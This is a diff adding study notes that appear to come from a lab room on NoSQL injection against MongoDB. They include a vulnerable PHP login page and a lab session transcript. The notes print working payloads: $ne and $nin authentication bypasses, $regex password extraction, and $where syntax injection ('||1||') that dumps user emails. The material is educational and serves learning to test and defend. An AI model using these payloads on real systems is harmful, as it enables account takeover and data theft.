@@ -1,0 +1,190 @@
+# NoSQL Injection
+
+## TASK 2 What is NoSQL?
+
+Just as relational databases use some variant of SQL, non-relational databases such as MongoDB use NoSQL.
+
+    To filter documents where `last_name` is "Sandler":  
+        ['last_name' => 'Sandler']
+
+    To filter documents where `gender` is male and `last_name` is "Phillips":  
+        ['gender' => 'male', 'last_name' => 'Phillips'] 
+
+    To filter documents where `age` is less than 50:  
+        ['age' => ['$lt' => '50']]
+
+## TASK 3 NoSQL Injection
+
+There are two main types of NoSQL Injection:
+
+    Syntax Injection    -   This is similar to SQL injection, where we have the ability to break out of the query and inject our own payload. 
+                            The key difference to SQL injection is the syntax used to perform the injection attack.
+    Operator Injection  -   Even if we can't break out of the query, we could potentially inject a NoSQL query operator that manipulates the query's behaviour, allowing us to stage attacks such as authentication bypasses.
+
+NoSQL filters use structured arrays, making injection seem difficult. 
+Unlike SQL injection, NoSQL requires injecting arrays. 
+
+    Simple login page:
+
+```
+<?php
+$con = new MongoDB\Driver\Manager("mongodb://localhost:27017");
+
+
+if(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
+        $user = $_POST['user'];
+        $pass = $_POST['pass'];
+
+        $q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
+        $record = $con->executeQuery('myapp.login', $q );
+        $record = iterator_to_array($record);
+
+        if(sizeof($record)>0){
+                $usr = $record[0];
+
+                session_start();
+                $_SESSION['loggedin'] = true;
+                $_SESSION['uid'] = $usr->username;
+
+                header('Location: /sekr3tPl4ce.php');
+                die();
+        }
+}
+header('Location: /?err=1');
+
+?>
+```
+
+    The web app queries MongoDB's "myapp.login" collection with ['username'=>$user, 'password'=>$pass], where $user and $pass come from POST parameters. 
+        ['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]  
+    It tricks the DB into returning any document where username and password don't match the given values, bypassing authentication. 
+
+    To pass arrays via POST, use:
+        user[$ne]=xxxx&pass[$ne]=yyyy
+
+## TASK 5 Operator Injection: Logging in as Other Users
+
+We bypassed the login screen but could only log in as the first user. 
+Using the `$nin` operator, we can control which user to access. 
+
+    The `$nin` operator filters documents where a field is not in a list.
+        ['username'=>['$nin'=>['admin']], 'password'=>['$ne'=>'aweasdf']]
+    This excludes the `admin` user. To exclude more users, expand the list:
+        ['username'=>['$nin'=>['admin', 'jude']], 'password'=>['$ne'=>'aweasdf']]
+
+    To pass arrays via POST, use:
+        user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=yyyy
+    Repeat as needed to access other accounts.
+
+## TASK 6 Operator Injection: Extracting Users' Passwords
+
+We can extract passwords by abusing the `$regex` operator, similar to hangman.
+
+    Guess password length:
+        Use payload: `['username'=>'admin', 'password'=>['$regex'=>'^.{7}$']]`
+        The Location header in server response will show error if not match.
+        If login fails, length isn't 7. Repeat until correct length is found.
+
+    Guess password content:
+        Use payload: `['username'=>'admin', 'password'=>['$regex'=>'^c....$']]`
+        If login fails, first letter isn't "c". Iterate over characters until success.
+
+    Repeat for all letters:
+        Continue until full password is recovered. Repeat for other users if needed.
+    Repeat as needed to access other accounts.
+
+    To pass arrays via POST, use:
+        user=john&pass[$regex]=^.{8}$
+
+## TASK 7 Syntax Injection: Identification and Data Extraction
+
+Finding Syntax Injection
+
+    A Python application is running to allow you to receive the email address of any username that is provided. 
+
+```
+ssh syntax@10.81.129.104
+syntax@10.81.129.104's password: 
+Please provide the username to receive their email:admin
+admin@nosql.int
+Connection to 10.81.129.104 closed.
+```
+
+    We can start to test for Syntax Injection by simply injecting a ' character, which will result in the error seen in the response below:
+
+```
+ssh syntax@10.81.129.104
+syntax@10.81.129.104's password: 
+Please provide the username to receive their email:admin'
+Traceback (most recent call last):
+File "/home/syntax/script.py", line 17, in <module>
+    for x in mycol.find({"$where": "this.username == '" + username + "'"}):
+File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1248, in next
+    if len(self.__data) or self._refresh():
+File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1165, in _refresh
+    self.__send_message(q)
+File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1272, in _run_operation
+    retryable=isinstance(operation, message._Query),
+File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1371, in _retryable_read
+    return func(session, server, sock_info, read_pref)
+File "/usr/local/lib/python3.6/dist-packages/pymongo/server.py", line 134, in run_operation
+    _check_command_response(first, sock_info.max_wire_version)
+File "/usr/local/lib/python3.6/dist-packages/pymongo/helpers.py", line 180, in _check_command_response
+    raise OperationFailure(errmsg, code, response, max_wire_version)
+pymongo.errors.OperationFailure: Failed to call method, full error: {'ok': 0.0, 'errmsg': 'Failed to call method', 'code': 1, 'codeName': 'InternalError'}
+Connection to 10.81.129.104 closed.
+```
+
+    The following line in the error message shows us that there is Syntax Injection:
+
+```
+for x in mycol.find({"$where": "this.username == '" + username + "'"}):
+```
+
+    The username variable is concatenated into the query string, enabling injection. 
+    Verbose error messages confirm this, but even without them, testing with false and true conditions can reveal injection, as shown below:
+
+```
+ssh syntax@10.81.129.104
+syntax@10.81.129.104's password: 
+Please provide the username to receive their email:admin' && 0 && 'x
+Connection to 10.81.129.104 closed.
+
+ssh syntax@10.81.129.104
+syntax@10.81.129.104's password: 
+Please provide the username to receive their email:admin' && 1 && 'x
+admin@nosql.int
+Connection to 10.81.129.104 closed.
+```
+
+    In JavaScript, `&&` is the logical AND operator.
+    It evaluates left to right:
+        If the left side is false, the whole expression is false.
+        If the left side is true, the result is the right side.
+    Without `'x'`: the injection still works — `&& 0` forces false, `&& 1` forces true.
+    With `'x'`: you're just appending a harmless string literal to keep the syntax neat and avoid edge cases.
+
+Exploiting Syntax Injection
+
+    Confirmed Syntax Injection allows dumping all emails. 
+    Inject '||1||' to ensure the condition always evaluates true, disclosing sensitive data.
+
+```
+ssh syntax@10.81.129.104
+syntax@10.81.129.104's password: 
+Please provide the username to receive their email:admin'||1||'
+admin@nosql.int
+pcollins@nosql.int
+jsmith@nosql.int
+[...]
+Connection to 10.81.129.104 closed.
+```
+
+The Exception to the Rule
+
+    Syntax Injection occurs when developers use custom JavaScript queries instead of built-in filters like ['username': username], which are not vulnerable. 
+    This is rare, as built-in functions are safer and sufficient for most cases. 
+    While some complex queries may require JavaScript, avoiding it is recommended to prevent injection risks. 
+    The example above is specific to MongoDB; other NoSQL databases may have similar vulnerabilities with different syntax.
+
+## Appendix:
